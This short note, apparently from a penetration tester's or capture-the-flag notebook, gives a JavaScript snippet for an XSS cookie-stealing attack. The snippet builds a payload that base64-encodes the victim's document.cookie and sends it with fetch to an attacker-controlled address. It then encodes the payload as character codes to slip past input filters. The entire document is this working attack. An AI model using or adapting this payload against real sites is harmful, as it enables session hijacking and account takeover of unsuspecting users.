
XSS cookie stealing using charcode bypass:
---
#xss #charcode #bypass #cookies 
```js
const attacker = `http://10.10.14.164/cb`;
const xssString = `var attacker = "${attacker}";
fetch(attacker + "?cb=" + encodeURI(btoa(document.cookie)))`
const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',')
console.log(payload)
```
